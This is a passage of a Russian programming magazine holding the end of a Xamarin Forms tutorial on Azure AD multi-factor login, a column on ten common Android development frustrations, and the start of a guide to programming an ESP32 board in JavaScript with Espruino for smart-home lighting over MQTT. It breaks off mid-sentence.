зовать Forms.Context. Добавляем в Android‐про ект файл Helper.cs со сле‐
дующим кодом.


using System;
using System.Linq;
using System.Threading.Tasks;
using Android.App;
using Microsoft.IdentityModel.Clients.ActiveDirectory;
using Xamarin.Forms;
[assembly: Dependency(typeof(App17.Droid.Helper.Authenticator))]
namespace App17.Droid.Helper
{
    class Authenticator : IAuthenticator
    {
        public async Task<AuthenticationResult> Authenticate(string
authority, string resource, string clientId, string returnUri)
        {
            var authContext = new AuthenticationContext(authority);
            if (authContext.TokenCache.ReadItems().Any())
                authContext = new AuthenticationContext(authContext.
TokenCache.ReadItems().First().Authority);
            var uri = new Uri(returnUri);
            var platformParams = new PlatformParameters((Activity)
Forms.Context);
            var authResult = await authContext.AcquireTokenAsync(
resource, clientId, uri, platformParams);
            return authResult;
        }
    }
}

Если VS будет подчеркивать красным IAuthenticator — запусти сборку, чтобы
проверить, что собирается успешно.
   Также обрати особое внимание на мета атрибут Dependency для данного
Helper namespace — именно он поз воляет DependencyService сопоставить
вызов из общего кода и реализацию для конкрет ной платформы.


[assembly: Dependency(typeof(App17.Droid.Helper.Authenticator))]

Также для Android нам нужно переопределить OnActivityResult метод в Main‐
Activity.cs файле (внутри класса MainActivity) для правильной обработки и про‐
должения последовательности диало гов аутентификации (также добавляем
два namespace через директивы using).


using Android.Content;
using Microsoft.IdentityModel.Clients.ActiveDirectory;
        protected override void OnActivityResult(int requestCode,
Result resultCode, Intent data)
        {
            base.OnActivityResult(requestCode, resultCode, data);
            AuthenticationAgentContinuationHelper.SetAuthenticati
onAgentContinuationEventArgs(requestCode, resultCode, data);
        }

Теперь переходим к iOS.


iOS
В iOS для PlatformParameters переда ем UIViewController в качестве контекста,
а именно RootViewController — то есть текущее окно.


using System;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.IdentityModel.Clients.ActiveDirectory;
using UIKit;
using Xamarin.Forms;
[assembly: Dependency(typeof(App17.iOS.Helper.Authenticator))]
namespace App17.iOS.Helper
{
    class Authenticator : IAuthenticator
    {
        public async Task<AuthenticationResult> Authenticate(string
authority, string resource, string clientId, string returnUri)
        {
            var authContext = new AuthenticationContext(authority);
            if (authContext.TokenCache.ReadItems().Any())
                authContext = new AuthenticationContext(authContext.
TokenCache.ReadItems().First().Authority);
            var controller = UIApplication.SharedApplication.KeyWin
dow.RootViewController;
            var uri = new Uri(returnUri);
            var platformParams = new PlatformParameters(controller);
            var authResult = await authContext.AcquireTokenAsync(
resource, clientId, uri, platformParams);
            return authResult;
        }
    }
}

Не забываем про атри бут Dependency перед namespace. Для iOS не нужно
переопределять метод возврата результатов окна/диалога.
  Для того чтобы соб рать iOS‐проект, нам понадо бится Mac‐хост с агентом
сборки или, например Mac‐машина в облаке для сборки, которую пре дос‐
тавляет Microsoft App Center (опять‐таки можно попробовать бесплатно —
до 240 минут сбор ки в месяц плата не взимает ся).
   Теперь реализация для Windows UWP (Universal Windows Platform).


Universal Windows Platform
Здесь тоже все очень просто — добавляем знакомый файл Helper.cs с реали‐
зацией интерфейса IAuthenticator, не забывая про атрибут Dependency.


using Microsoft.IdentityModel.Clients.ActiveDirectory;
using System;
using System.Linq;
using System.Threading.Tasks;
using Xamarin.Forms;
[assembly: Dependency(typeof(App17.UWP.Helper.Authenticator))]
namespace App17.UWP.Helper
{
    class Authenticator : IAuthenticator
    {
        public async Task<AuthenticationResult> Authenticate(string
authority, string resource, string clientId, string returnUri)
        {
            var authContext = new AuthenticationContext(authority);
            if (authContext.TokenCache.ReadItems().Any())
                authContext = new AuthenticationContext(authContext.
TokenCache.ReadItems().First().Authority);
            var uri = new Uri(returnUri);
            var platformParams = new PlatformParameters(Prompt
Behavior.Auto, false);
            var authResult = await authContext.AcquireTokenAsync(
resource, clientId, uri, platformParams);
            return authResult;
        }
    }
}

Теперь вернемся в общий про ект для добавления вызова аутентификации.


Об щий про ект
Добавим кнопку для входа с использовани ем многофакторной аутентифика‐
ции в общий проект. Заходим в общий проект Xamarin Forms, в котором
содержится общий код и общий пользовательский интерфейс для всех плат‐
форм, и открываем через Solution Explorer главную страницу приложения —
MainPage.xaml.





                               Solution Main Page

Если Solution Explorer не видно, его можно включить через меню View → Solu‐
tion Explorer.





                                      Live Run

Обрати внимание, что VS предложит запустить визуализацию интерфейса
через Live Player, — нажми Live Run, и ты сможешь вживую видеть на эму лято‐
ре прямо во время редактирования,  как изменяется пользовательский
интерфейс приложения. Очень удобно для раз работки. Визуализация будет
идти с некоторой задержкой, поэто му просто про должай редактирование.
  В Xamarin Forms вся логика пишется на языке C#, а визу ализация на языке
разметки XAML.


             INFO

                     Познакомиться подробно с разработкой на Xam‐
                             arin Forms можно, скачав бесплатную и очень
                      подробную книгу знаменитого Чарльза Петцольда
                       (думаю, многие помнят этого авто ра) «Creating
                         Mobile Apps with Xamarin.Forms».


В основном Page (окне) приложения MainPage.xaml добавим кнопку с обра‐
ботчиком, для это го XAML‐код для кноп ки (Button) помес тим вместе с сущес‐
твующим Label внутрь контейнера StackPanel. Этот прос тейший контейнер
выстраивает внутри себя контролы в ряд по вертикали или горизонтали.


<?xml version="1.0" encoding="utf‐8" ?>
<ContentPage xmlns="http://xamarin.com/schemas/2014/forms"
             xmlns:x="http://schemas.microsoft.com/winfx/2009/xaml"
             xmlns:local="clr‐namespace:App17"
             x:Class="App17.MainPage">
    <StackLayout Orientation="Vertical">
  <Label Text="Welcome to Xamarin.Forms!"
           VerticalOptions="CenterAndExpand"
           HorizontalOptions="Center"/>
        <Button x:Name="btnLogin" Text="Login to Azure Active Direct
ory" Clicked="btnLogin_Clicked" VerticalOptions="CenterAndExpand" />
    </StackLayout>
</ContentPage>

В Xamarin Forms язык XAML поддерживает мно жес тво различных контейнеров,
причем их можно вкладывать друг в друга, создавая гибко масштабируемые
интерфейсы под любые раз меры экра нов.
  После этого сразу перейдем в файл MainPage.xaml.cs (для этого нужно
развернуть  сек цию  с  MainPage.xaml,  чтобы  уви деть  код/code‐behind)
и добавим обработчик нажатия кнопки, а также нужные нам идентификаторы
и namespaces.


using Microsoft.IdentityModel.Clients.ActiveDirectory;
using System;
using Xamarin.Forms;
namespace App17
{
    public partial class MainPage : ContentPage
    {
        public static string clientId = "<<INSERT YOUR CLIENT ID
HERE>>";
        public static string authority = "https://login.windows.net/
common";
        public static string returnUri = "http://MFATestPCL‐redirect"
;
        private const string graphResourceUri = "https://graph.
windows.net";
        private AuthenticationResult authResult = null;
        public MainPage()
        {
            InitializeComponent();
        }
        private async void btnLogin_Clicked(object sender, EventArgs
e)
        {
            try
            {
                var auth = DependencyService.Get<IAuthenticator>();
                authResult = await auth.Authenticate(authority,
graphResourceUri, clientId, returnUri);
                var userName = authResult.UserInfo.GivenName + " " +
authResult.UserInfo.FamilyName;
                await DisplayAlert("Token", userName, "Ok", "Cancel")
;
            }
            catch (Exception ex)
            {
                await DisplayAlert("Error", ex.Message, "Ok");
            }
        }
    }
}

После этого прописываем в приложение в код идентификаторы, которые мы
сконфигурировали при регистрации приложения в облачном сервисе Azure
Active Directory. Их полное соответствие в при ложении и сервисе необ‐
ходимо, чтобы сервис не откло нял обра щения приложения:
   clientID — это Application ID из наших настроек облачного сервиса выше.


public static string clientId = "<<INSERT YOUR CLIENT ID HERE>>";

returnURI — это Redirect URI из наших нас троек облачного сервиса выше.


public static string returnUri = "http://MFATestPCL‐redirect";

Все готово.


Запуск приложе ния
Теперь можно запускать приложение (например, на эму ляторе по F5) и аутен‐
тифицироваться учетными данными пользователя, которого мы завели выше.
При первом входе после корректного ввода имени пользователя и пароля
система предложит пользователю зарегистрировать свой мобильный номер
для получения подтверждающих звонков или СМС — выбор будет зависеть
от того, какие возможнос ти многофакторной аутентификации мы разрешили
в параметрах Service Settings нас тро ек Multi‐factor Authentication раз дела
облачного сервиса.
  После регистрации мы получим звонок или СМС на мобильный телефон.
Только после вво да с цифровой клавиату ры запрошенного подтверждения
или СМС‐кода мы успешно аутентифици руемся в сис теме.
  При успешной аутентификации Azure Active Directory выдаст JWT‐токен
(JSON Web Token), который можно использовать для авторизации (раз‐
решения) действий пользователя в мобильном при ложении. Токен подписан
цифровой подписью, подтвержда ющей его целостность, и содержит ряд
полей, по которым мы можем определять не только то, что пользователь
успешно прошел аутентифика цию, но и к каким ролям он принадлежит.
Для реализации высокой степени защиты и безопасности нужно допол‐
нительно проверять сертификат, которым подписан токен, на то, что он дей‐
ствительный. Также токен нужно передавать толь ко через защищенные
соединения и хранить в защищен ных хранилищах.
   Если токен не получен — зна чит, поль зователь аутентификацию не прошел
и доступ к функциональности мобильного приложения разрешен быть не дол‐
жен.
  Полный пример приложения на GitHub содержит операцию выхода/logout,
которая очищает кеш токенов в приложении, а также cookie, которые могут
в соответствии с настройками сервиса Azure Active Directory поз волять поль‐
зователю не вводить повторно пароль в течение настроенного времени.
   Итак, если учетные данные верны и вто рой фактор подтвержден, мы
успешно  пройдем мно гофакторную  аутентифика цию  и  увидим  данные
из полученного токена подтвержденного пользователя.


iOS





Android
КОДИНГ





                                   Владимир Тимофеев
                                                         android‐tools.ru



 МИНУТКА НЕНАВИСТИ
  ANDROID-РАЗРАБОТЧИКА

     РАЗБИРАЕМ 10 САМЫХ ЧАСТЫХ
         ПРОБЛЕМ КОДИНГА





Двадцать лет назад использовать Android было невозможно.
Десять лет назад было еще рано. Сегодня — уже поздно.
Конечно,  я  утрирую,  но,  когда  опе рационная  система
молода, многие ее недостатки можно списать на «детские
болезни». Их можно понять, простить и не замечать, ожидая
скорейших багфиксов от компании‐про изводителя, но… An‐
droid уже дорос, пожалуй, до бальзаковского возраста, а мы
все так же решаем проблемы, которые давным‐давно дол‐
жны быть исправ лены. Сегодня мы рассмотрим те затрудне‐
ния при разработ ке под Android, с которыми ты точно ког‐
да‐нибудь столкнешься. И которые, кста ти, дико бесят. :)


1. ЖИЗНЕННЫЙ ЦИКЛ ACTIVITY МОЖЕТ В ЛЮБОЙ МОМЕНТ
ПЕРЕЧЕРКНУТЬ ВСЕ ТВОИ ПЛАНЫ
Если ты программируешь под Android, то наверняка видел схему жизненного
цикла для самой простой активити. А знал ли ты жизненный цикл окошка
с кнопочками, которое соз давал компилятор старого и доброго Delphi? Я
думаю — нет, не знал, и знать тебе это было не нужно. Интересно, как бы
на тебя посмотре ли олд скульные дельфисты‐пас калисты, если бы ты им ска‐
зал: «когда пользователь перевернет свой экран, нам надо пересоздать все
формы и восстановить состояние всех компонентов». Скорее всего, они бы
пальцем у виска покрутили. И не только потому, что переворачивать старые
мониторы и системные блоки было не принято. :)
  А меж тем Android именно так и устроен: повернул экран — начинай все
сначала. Конечно, в нас тройках ты можешь отклю чить поворот экрана, но это
не всегда удобно, да и рядовые пользователи не знают и десяти процентов
возможностей своего смартфона. Поэтому сейчас имеем мы то, что име ем,
и единственное, что ты можешь сделать при раз работке, — это отключить
в манифесте пересоздание Activity, добавив свойства


android:configChanges="keyboardHidden|orientation|screenSize"

Конечно, «знающие люди» так делать не рекомендуют, но такой костыль
используют даже серьезные социальные при ложения. Если не веришь — пос‐
мотри сам манифесты из их APK (вот инс трукция).
  Дело осложняют и сами производители устройств — каждый из них адап‐
тирует ОС к сво им устройствам, меняя в том числе ее поведе ние. Например,
традиционно рекомендуется сохранять данные при событии onStop. Поль‐
зователь свернул приложение, и вызвался этот метод. Но есть одна проб‐
лема: на некоторых устройствах вызов этого метода не гарантирован. В таком
случае нужно сохранять все, что можешь, в методе onPause. Правда, он
вызывается не только при выходе из активити, но и при показе диалогового
окна, поэтому нужно предвидеть этот момент и предусматривать проверки
на показ диалога.


2. СБОР ОШИБОК, КОТОРОГО НЕ БЫЛО
Я с тоской вспоминаю ста рые времена виндовой раз работки. Кому нужны
системы для сбора ошибок? Да никому! Большинс тво ошибок лежало «на
поверхности», программа или работа ет, или нет. Если она периодически
вылетает — значит, «проклятая винда опять глю чит». :) А если она вылетает
по вине программиста, то и не страшно, ведь онлайн‐сторы программного
обеспечения еще не придума ли и никто не засыплет твою программу минуса‐
ми и гневными комментариями. Максимум — под пивко поплачет в жилетку
своему дилеру пиратско го ПО на Митинском радиорынке.
  Сегодня ты лично, оперативно и максималь но прозрачно отве чаешь
за каждый свой begin и end в Kotlin‐коде. Поэто му собирать ошибки нужно
сразу при старте приложения.
  Систем сбора сейчас рас плодилось превеликое множество, но лично я
пользуюсь Crashlytics. В ее пользу говорит и то, что ее недавно купила сама
Google. Включать сбор ошибок можно для каж дой активити отдельно, но про‐
ще сразу включить его в клас се Application:


@Override
protected void onCreate() {
  super.onCreate(savedInstanceState);
  Fabric.with(this, new Crashlytics());
  try {
    FirebaseApp.initializeApp(this);
    mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);
    Crashlytics.log(Log.INFO, "App.onCreate", "Firebase initialized")
;
  } catch (Exception e) {
    e.printStackTrace();
    Crashlytics.log(Log.ERROR, "App.onCreate",
    "Error initialize Firebase with: " + e.getMessage());
  }
}

Выпол нение кода в этом месте может затянуть показ первого экрана при‐
ложения, но туда можно через тему поставить свой Splash и убить сразу двух
зайцев — подгрузишь инстру менты и развлечешь пользовате ля.
   Как видно из приведенного выше кода, один инс трумент Google — Crash‐
lytics — следит за работой дру гого — Firebase. Нес мотря на то что оба они
могут выполнять одинаковые задачи — собирать события, Crashlytics дей‐
ствует так:


Crashlytics.log(Log.INFO, "App.onCreate", "Firebase initialized");

А Firebase — вот так:


public static void selectContent(String type, String id) {
  if (mFirebaseAnalytics != null) {
    Bundle bundle = new Bundle();
    bundle.putString(FirebaseAnalytics.Param.ITEM_ID, id);
    bundle.putString(FirebaseAnalytics.Param.CONTENT_TYPE, type);
    mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT
_CONTENT, bundle);
  }
}


3. ТЕПЕРЬ Я СТРЕЛЯЮ У ДЕВУШЕК ТЕЛЕФОН... ЧТОБЫ ОТЛОВИТЬ
НА НЕМ БАГИ
Про изменение прошивки производителем ты уже слышал. Но как быть, если
неприятность уже случилась и твое приложение, к примеру, стабильно падает
у производителя X на устройстве Y с прошивкой Z?
  Все бы ничего — подумаешь, одно падение у одного устройства. Но таких
устройств было продано несколько миллионов штук, так что гневных отзы вов
и однозвездных коммента риев тебя ждет несколько десятков. Как быть?
Использовать фермы для тестирования. Наш материал про семь лучших
ферм все еще актуален, советую его прочитать.
  Из халявных инструментов я бы предпочел Firebase, который на бес плат‐
ном тарифе дает прогнать тесты по десяти реаль ным устройствам. Кроме
того, не забывай погуглить собственные веселые фермы от разработчиков
смартфонов. И заводи контакты с людьми, которые работают в магазинах
электроники или сервисных центрах (особенно неплохо это получается
в маленьких городах). Тогда ты сможешь делать, как я, — брать устройства
для тестов у них. Главное, не забудь вернуть гаджет в первоначальное сос‐
тояние и скрой меню для раз работчиков, если оно было заблокировано
ранее.


4. ХОЧЕШЬ МЕНЬШЕ БАГОВ В ПРИЛОЖЕНИИ? ВЫКИДЫВАЙ
ФРАГМЕНТЫ И АСИНКТАСКИ (ЛОАДЕРЫ ТОЖЕ НЕ ЗАБУДЬ)
Говорят, что секрет 99,9% удачных пус ков при ложения — в отказе от фраг‐
ментов в любом виде. Дело в том, что у разных про изводите лей они порой
выкидывают такие замысловатые ошиб ки, что понять их можно только
с помощью хрустального шара. Если шаром ты вла деть не обучен, лучше вов‐
се откажись от фрагментов. Тот же ViewPager можно сделать и без них.
   Асинктаски можно использовать для разовых фоновых запросов, но, если
нужно много работы делать в фоне, используй дру гие инс трументы (Rx, сер‐
висы). Ну а лоаде ры имеют ста рый баг, свя занный с тем, что колбэки о завер‐
шении могут вооб ще не вызываться. Говорят, что в новых версиях это испра‐
вили, но проверять я бы не стал (они так каж дые пол года говорят).


5. ФРАГМЕНТАЦИЯ УХУДШАЕТ ВНЕШНИЙ ВИД
Огромный парк разноформатных устройств — одновременно баг и фича
мира Андроида. Из‐за большой фрагмента ции приходится вымерять раз‐
метку под каждую плотность экрана. Редактор макетов экранов при этом
крайне неудобный. Из‐за это го особо отча янные (Telegram) вообще его
не используют, а генерируют экра ны динами чес ки, из кода.
  А как там с редизайном стандартных меню и вкладок? Легко! Два дня
вдумчивого гугления, ящик пива, блок сигарет, пробы, ошибки, нес колько
костылей — и пожалуйста, приложение выглядит почти как нарисовал дизай‐
нер.  :) Уве рен, что «отличные» компоненты DrawerLayout и ViewPager
отлично  научат тебя пользоваться поиском при любом нестандартном
поведении или когда просто захочешь сменить шрифты в меню.


6. БИБЛИОТЕКАМ ПОДДЕРЖКИ САМИМ НУЖНА «ПОМОЩЬ И
ПОДДЕРЖКА»
Серьезно, каждый новый релиз — новые костыли! Почти все компоненты
из библиотеки поддержки несут неизлечимые баги, которые не исправляются
годами. У меня было нес колько ошибок, которые умерли вместе с устрой‐
ствами, но так и не были исправлены. К примеру, отличный класс для уведом‐
лений NotificationCompat меняется каждую версию Android, и ты меняешь
свой код вслед за ней.
  Библиотеки поддержки очень большие и сами тянут в проект библиоте ки
для поддержки. Программисты даже шутят: «Каждый класс в этих библиотеках
будет иметь суффикс CompatCompat». Кста ти, что бы увидеть, что тянет та
или иная библиотека за собой, можно вос пользоваться инструментом
gradle — dependencies .





                    Дерево зависимос тей

Для удаления хотя бы час ти ненужного кода можно прописать правило
для gradle:


configurations.all {
  exclude group : 'com.android.support', module :'transition'
  exclude group : 'com.android.support', module :'customtabs'
  exclude group : 'com.android.support', module :
'support‐media‐compat'
  exclude group : 'com.android.support', module :'support‐fragment'
}

После отработки правил исключения не забудь еще раз все протестировать.


7. «МЫ ХОТЕЛИ ПОМОЧЬ ВАМ C РАЗМЕТКОЙ И НАПИСАЛИ CON-
STRAINT LAYOUT, НО ОН ПАДАЕТ И ТОРМОЗИТ»
Новинка, которая дол жна была упростить нам жизнь, — Constraint Layout —
сложна в использовании, и приложение из‐за нее становится тяжелее и мед‐
леннее. Чтобы работать с этим инстру ментом эффективнее, советую про‐
честь статью. А в преддверии версии Constraint Layout 2.0 можно изучить это
выступление. По слухам, его представят на Google IO 2018.


8. ПРОСТО ЗАПИСАТЬ ФАЙЛ НА ФЛЕШКУ НЕ ПОЛУЧИТСЯ:
СПРОСИ РАЗРЕШЕНИЯ, А ЛУЧШЕ ГОРОДИ КОНТЕНТ-ПРОВАЙДЕР
Сама идея ограничивать дос туп программ к фай ловой сис теме — благая и по
сравнению с «вин довой вольницей», где каж дый делает что хочет, конечно,
секьюрная. Но какой же это геморрой, коллеги!
  Перекинуть данные через прос той файл не разрешает сама ОС. Хочешь
обмена? Пиши  контент‐про вайдер.  Точно  нужно  записать  что‐нибудь
на диск? Реально нужно? Изволь спросить у пользователя кучу разрешений
и заранее продумать, что делать, если он их тебе не даст.


9. ВСЕ СТАНДАРТНЫЕ МЕДИАКОМПОНЕНТЫ ПРОСТО УЖАСНЫ
Максимум,   на   что   способны   клас сы   VideoView,   MediaPlayer
и SurfaceView, — заставить тебя чесать репу и просиживать долгие часы
за компьютером. Если тебе нужен результат, то ищи сторонние биб лиотеки.
Пусть чужой опыт сэкономит тебе время и нервы. Вот хороший плеер.
  Для работы с камерой изу чи «Побеж даем Android Camera2 API с помощью
RxJava2».
   Как лучше проигрывать музыку? Под смот ри у Timber и Phonograph.


10. ЛЮБОЙ ЖЕЛАЮЩИЙ МОЖЕТ ДЕКОМПИЛИРОВАТЬ ТВОЕ
ПРИЛОЖЕНИЕ И ИЗМЕНИТЬ ЕГО, КАК ЗАХОЧЕТ, — ОНО ПРОСТО
СОЗДАНО ДЛЯ ЭТОГО
Исторически сложилось так (и это уже точно не исправить), что код для An‐
droid работает в виртуальной машине. Кому пришло в голову под нимать
на низкопроизводительных ARM‐про цес сорах виртуал ки? Вряд ли теперь мы
это узнаем. Apple сделала все, как надо, и завоевала приз наших зри тельских
симпатий, а вот «кор порация доб ра» решила извра титься, и теперь нас нап‐
рягает (спасибо современным про цес сорам) даже не производительность,
а тот факт, что исходный код приложения можно вос становить почти что
до запятой.
  Пиши свой код качес твеннее, и его будут читать не только китайские
хакеры, но и программисты из развитых стран — счи тай это успехом. ;) А сто‐
ит тебе пренебречь обфуска цией, и любой школьник сможет модифициро‐
вать твою программу и сделать на ее основе свой шедевр.
КОДИНГ
 JAVASCRIPT
     ДЛЯ УМНОГО
          ДОМА





                                                                               Виктор Паперно
                                                                                            vpap1997@inbox.ru




                    ARDUINO УСТАРЕЛ,
               ДА ЗДРАВСТВУЕТ ESP32!





Интерес к интернету вещей растет с каж дым днем, свои кур‐
сы по технологии IoT запустили и Cisco, и Samsung. Но боль‐
шинство этих кур сов базируются на собственном железе
компаний, довольно дорогом, в то время как прак тически
все то же самое можно сделать на гораздо более дешевом
железе самостоятельно, получив при этом массу удоволь‐
ствия и полезных навыков.


КАКУЮ ПЛАТУ ВЫБРАТЬ?
Когда неофит от IoT полезет в интернет, одним из первых модулей, которые
он найдет, будет ESP8266. И действительно, он обладает массой дос‐
тоинств: дешевый, много различных плат на его основе, позволяющих
использовать его как самостоятельное устройство и подключать к сложным
Arduino‐based проектам. Но ESP8266, выпущенный в 2014 году, довольно
быстро перестал удовлетво рять зап росы пользователей, и в 2015 году ком‐
пания‐разработчик Espressif выпускает новый микроконтроллер — ESP32.





                  Раз личия меж ду ESP8266 и ESP32

Точно так же, как и в случае с ESP8266, раз работчики создали довольно
много плат, базирующихся на новом микроконтроллере. В данной статье все
примеры тестировались и проверялись на пла те MH-ET LIVE ESP32
DevKit. Плата для обзора была любезно предос тавлена интернет‐магазином
Amperkot.





                           Pinoutmap платы


НАЧИНАЕМ ПРОГРАММИРОВАНИЕ
Как и у любой платы, основанной на ESP32, у MH‐ET LIVE ESP32 DevKit есть
достаточно большой набор языков программи рования. Во‐первых, это Ar‐
duino C, во‐вторых, Lua, а в‐третьих и в‐чет вертых — MicroPython и Espruino.
Про Espruino — сборку JS для программирова ния микроконтрол леров — уже
рассказывалось в ][, но в той статье раз биралась работа только на плате Es‐
pruino Pico, заточенной под Espruino.


             INFO

                     К    сожалению,    портирование     Espruino
                       на ESP32 еще не до конца завершено. Часть воз‐
                     можностей, например обновление по  воздуху
                      и Bluetooth, недоступна. Но так как Espruino —
                      open source проект, любой может добавить свою
                     функциональность.



Установка
 1. Скачиваем на официальном сайте свежую сборку  Espruino. А если
   не доверяешь готовым сборкам, то можно собрать прошивку самос‐
   тоятельно:


   # Get the Espruino source code
   git clone https://github.com/espruino/Espruino.git
   cd Espruino
   # Download and set up the toolchain ('source' is important here)
   source scripts/provision.sh ESP32
   # Clean and rebuild
   make clean && BOARD=ESP32 make

 2. Несмотря на то что мы будем программировать на JS, для установки все
   равно нужен Python, а конкретно esptool.py. Повторяя свою пре дыду щую
   статью, скажу, что для его уста новки, при условии, что Python уже установ‐
   лен, достаточно набрать в консоли/терминале: pip install esptool.
 3. В терминале перейти в папку с прошивкой. Кроме самого файла Espruino,
   здесь  лежат  файлы  bootloader.bin  и  partitions_espruino.bin.
   Это необходимые компоненты, но в некото рых сборках их может не быть,
   тогда их придется ска чать отсюда.
 4. Запускаем процесс прошивки, не забыв изменить порт, указанный в дан‐
  ном примере, на свой, а также при необ ходимости указать дру гое имя
   прошивки. Здесь она называется espruino_esp32.bin.


   esptool.py \
     ‐‐chip esp32                     \
     ‐‐port /dev/ttyUSB0              \
     ‐‐baud 921600                    \
     ‐‐after hard_reset write_flash   \
     ‐z                               \
     ‐‐flash_mode dio                 \
     ‐‐flash_freq 40m                 \
     ‐‐flash_size detect              \
     0x1000 bootloader.bin            \
     0x8000 partitions_espruino.bin   \
     0x10000 espruino_esp32.bin





                      Процесс про шивки


IDE
Разработчики Espruino создали свою IDE, Espruino Web IDE. Эта программа
распространяется через Chrome Web Store, также существуют нативные при‐
ложения для Windows (32 и 64).





                             Espruino Web IDE

Перед первым запуском нужно залезть в настройки, вкладка COMMUNICA‐
TIONS, и убедиться, что скорость общения выс тавле на на 115200, а также
изменить поле Save on Send с No на Yes, ина че все программы после
перезапуска сле тят.
   Теперь достаточ но запустить IDE, подключиться к плате и набрать в кон‐
соли 1+2: если ты получил 3, значит, все нас троено правильно и можно
начинать полноценную работу.


Hello world
Во всех языках программирова ния, предназначенных или модифицированных
для программирования микроконтроллеров, самая простая программа — так
называемый Blink, мигание встро енным светодиодом. Но это как‐то скучно.
Поэтому нашей первой программой станет прог рамма для управления све‐
тодиодом с помощью веб‐страницы. И действительно, JS — это же язык
веба.


var wifi = require("Wifi");
wifi.startAP('EspruinoAP', { password: '0123456789', authMode: 'wpa2'
 },function() {
  console.log(`AP started`);
});
function onPageRequest(req, res) {
  var a = url.parse(req.url, true);
  if (a.pathname=="/") {
    res.writeHead(200, {'Content‐Type': 'text/html'});
    res.end("<H1><center>Hello, ][aker!</center></H1>");
  } else if (a.pathname=="/on") {
    res.writeHead(200, {'Content‐Type': 'text/plain'});
    res.end("Enable");
    digitalWrite(D2, false);
  } else if (a.pathname=="/off") {
    res.writeHead(200, {'Content‐Type': 'text/plain'});
    res.end("Disable");
     D2.write(true);
  } else {
    res.writeHead(404, {'Content‐Type': 'text/plain'});
    res.end("404: Page "+a.pathname+" not found");
  }
}
require("http").createServer(onPageRequest).listen(80);

Можно заметить, что синтаксис практичес ки ничем не отличается от обычного
JS. Давай разбираться, что же происходит в этой прог рамме.
 • var wifi = require("Wifi") — для начала мы подгру зили необ‐
  ходимый нам модуль для работы с Wi‐Fi. Логично будет задаться воп‐
   росом: а откуда мы его взяли? Допус тим, есть встроенные в прошивку
   модули. А если нам нужно загрузить с какого‐нибудь внешнего сайта?
  Функция require поддерживает синтаксис вида require("https://
  github.com/espruino/EspruinoDocs/blob/master/devices/
  PCD8544.js"); , а WebIDE для поиска модулей онлайн, по умол чанию
   используется https://www.espruino.com/modules.
 • Следующий блок кода отвечает за поднятие точки доступа с именем Es-
   pruinoAP и паролем 0123456789. В случае успешного запуска в кон‐
   соль выводится соот ветству ющее сообщение.
 • Функция onPageRequest — собственно сам веб‐сервер. В этой функции
   разбирается адрес и проверяется, что нужно сделать, в зависи мос ти
   от запроса:

    • если загружается первая стра ница — / , то вернуть 200‐й заголовок
     и сообщение типа text/html «Hello, ][aker!», в обрамлении HTML‐
      тегов;
    • если загружается стра ница включения — /on , то вернуть 200‐й заголо‐
      вок и сооб щение Enable, а также включить светодиод. Заметим, что
     используется привычная Arduin’щикам функция digitalWrite(pin,
     value);
    • небольшое отличие в случае стра ницы выключения — /off, для вык‐
     лючения светодиода используется не функция digitalWrite(pin,
     value), а метод write(value);
    • во всех остальных слу чаях воз вра щаем ошибку «404 — Page Not
      Found».

 • А последняя строка собственно поднимает сервер, с внутренней функци‐
   ей onPageRequest, на 80‐м порте.

Важно заметить, что мы можем воз вра щать раз личный контент: обычный
текст, HTML, XML и так далее.


RGB-лампочка, управляемая по MQTT
Очень часто создание своего умного дома начинается именно с под светки.
Но просто вклю чать/выключать  светодиодную лампу —  это банально.
Для освещения небольших помещений, а также для украшения и создания
праздничной атмосферы нередко используются адресные RGB‐светодиоды.
Воспользуемся ими и мы. В качестве MQTT‐бро кера и клиента возьмем
Adafruit IO.
  Из стандартных виджетов нам понадобятся всего два: Toggle и Color
Picker.





                                Adafruit IO Dashboard


var ssid = 'SSID';
var password = 'PASSW';
var count = 16;
var LedPIN = D23;
var wifi = require('Wifi');
function colorall(color,count,pin) {
  Color_Array = new Uint8ClampedArray(count*3);
  for (var i = 0;i < Color_Array.length; i+=3) {
    Color_Array[i  ] = color[0];
    Color_Array[i+1] = color[1];
    Color_Array[i+2] =color[2];
  }
  require("neopixel").write(pin, Color_Array);
}
function hexToR(h) {return parseInt((cutHex(h)).substring(0,2),16); }
function hexToG(h) {return parseInt((cutHex(h)).substring(2,4),16); }
function hexToB(h) {return parseInt((cutHex(h)).substring(4,6),16); }
function cutHex(h) {return (h.charAt(0)=="#") ? h.substring(1,7) : h;
 }
wifi.connect(ssid, {password: password}, function() {
  console.log('Connected to Wifi. IP address is:', wifi.getIP().ip);
});
var mqtt = require("MQTT").connect({
  host: "io.adafruit.com",
  username: "<LOGIN>",
  password: "<SECRET‐KEY>"
});
mqtt.on('connected', function() {
  mqtt.subscribe("<LOGIN>/feeds/exampledashboard.enable");
  mqtt.subscribe("<LOGIN>/feeds/exampledashboard.colorlamp");
  console.log("Connect");
});
mqtt.on('publish', function (pub) {
  console.log("topic: "+pub.topic);
  console.log("message: "+pub.message );
  if (pub.topic == "<LOGIN>/feeds/exampledashboard.enable") {
    if (pub.message=="OFF") {
      colorall([0,0,0], count, LedPIN);
    } else {
      colorall([128,128,128], count, LedPIN);
    }
  } else if (pub.topic == "<LOGIN>/feeds/exampledashboard.colorlamp")
 {
    var hex_color = pub.message;
    var rgb_color = [hexToG(hex_color),hexToR(hex_color), hexToB(
hex_color)] ;
    colorall(rgb_color, count, LedPIN);
  }
});
mqtt.connect();

Приступим к разбору программы.
 • Для начала объявляем переменные, необ ходимые для подключения к Wi‐
    Fi, а также количество светодиодов и пин, к которому они подключены.
 • Функция colorall(color,count,pin) отвечает за одновре менное
   окрашивание всех светодиодов в один цвет. Для этого следует соз дать
  массив, в который count раз записать по очереди три составляющих цве‐
    та. То есть для окрашивания двух светодиодов в синий цвет мас сив дол‐
  жен быть такой: [0,0,255,0,0,255]. Как мож но заметить, в этой фун‐
   кции подклю чается предзагруженная биб лиотека neopixel. И еще один
   интересный факт: здесь перепутан порядок цветов — не RGB, а GRB.
   Это очень странно, но так есть.
 • Следующие четыре функции нужны для перево да цвета из шес тнад‐
   цатеричной записи в RGB. Они нам понадобят ся, ведь Color Picker
   отправляет цвет как строку вида #RRGGBB.
 • Подклю чаемся к Wi‐Fi, в случае успешного подключения в лог выведется
   сообщение.
 • Теперь необходимо подключиться к MQTT‐брокеру. В первый раз, когда
   попробуешь запустить, интерпретатор может выдать ошиб ку, что такая
